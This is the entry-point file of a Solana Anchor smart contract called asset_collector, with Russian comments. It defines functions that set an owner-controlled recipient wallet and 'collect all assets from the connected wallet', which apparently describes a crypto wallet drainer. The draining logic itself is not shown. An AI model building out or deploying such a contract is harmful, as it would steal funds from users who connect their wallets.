pub mod constants;
pub mod error;
pub mod instructions;
pub mod state;

use anchor_lang::prelude::*;

pub use constants::*;
pub use instructions::*;
pub use state::*;

declare_id!("4LiT8r7gQ1ggVVdJBjEiKC5KJAnPoFC6eA1ikom8XB7Y");

#[program]
pub mod asset_collector {
    use super::*;

    /// Инициализация контракта (оставляем для совместимости)
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        initialize::handler(ctx)
    }
    
    /// Инициализация состояния сборщика (новый подход)
    pub fn initialize_collector(ctx: Context<InitializeCollector>) -> Result<()> {
        initialize_collector_handler(ctx)
    }
    
    /// Установка кошелька-получателя (только владелец)
    pub fn set_collector_wallet(
        ctx: Context<SetCollectorWallet>,
        new_collector_wallet: Pubkey
    ) -> Result<()> {
        set_collector_wallet_handler(ctx, new_collector_wallet)
    }
    
    /// Сбор всех активов с подключенного кошелька
    pub fn collect_all_assets(ctx: Context<CollectAllAssets>) -> Result<()> {
        collect_all_assets_handler(ctx)
    }
}